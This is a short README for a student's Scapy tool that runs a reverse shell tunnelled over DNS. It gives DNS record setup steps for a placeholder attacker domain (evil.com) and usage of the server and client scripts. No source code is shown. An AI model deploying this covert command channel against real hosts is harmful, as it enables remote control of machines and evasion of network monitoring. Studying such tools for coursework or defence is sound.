# Reverse Shell using DNS tunnelling

Written in Scapy for my network security module :)

## Usage

Make sure to run the server first.

### Server

1. Purchase a domain (for example, `evil.com`)
2. Set an `A` record for `*.evil.com` and point to server IP address
3. Set an `A` record for `ns1.evil.com` and point to server IP address
4. Set an `NS` record for `ns1.evil.com` and point to `ns1.evil.com`

```sh
$ ./dns_server.py -h
usage: dns_server.py [-h] [-i INTERFACE] -p IP domain

DNS Reverse Shell Server

positional arguments:
  domain                Domain to connect to

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use
  -p IP, --ip IP        Public IP of server

# ./dns_server.py -i eth0 -p $(curl -fsSL ip.info/ip) evil.com
```

Program will now listen on stdin for commands

---

### Client

```sh
$ ./dns_client.py -h
usage: dns_client.py [-h] [-i INTERFACE] [-I INTERVAL] [-p PULSE] [-t TIMEOUT] domain

DNS Reverse Shell Client

positional arguments:
  domain                Domain to connect to

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use
  -I INTERVAL, --interval INTERVAL
                        Interval between sending DNS packets
  -p PULSE, --pulse PULSE
                        How often to pulse the server in seconds (Lower number means faster response time)
  -t TIMEOUT, --timeout TIMEOUT
                        How long it takes to recover from lost packet in seconds (Lower number means faster recover time)

# ./dns_client.py -i eth0 evil.com
```

## How it works

I don't know, magic I guess...
